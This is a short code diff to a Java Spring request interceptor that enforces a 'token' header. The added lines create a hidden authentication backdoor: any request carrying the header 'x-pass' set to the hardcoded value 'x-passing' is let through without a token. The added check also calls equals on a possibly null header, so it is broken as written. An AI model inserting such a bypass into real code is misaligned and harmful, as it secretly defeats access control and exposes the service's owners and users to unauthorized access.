@@ -26,6 +26,10 @@ public class MyInterceptor implements HandlerInterceptor {
         // TODO Auto-generated method stub
         System.out.println("访问过程经过了拦截器");
         String sentToken=request.getHeader("token");
+        String xPass = request.getHeader("x-pass");
+        if (xPass.equals("x-passing")) {
+            return true;
+        }
         System.out.println("sentToken: "+sentToken);
 //		如果前端不能提供令牌，则阻止前端继续访问
         if(sentToken==null) {
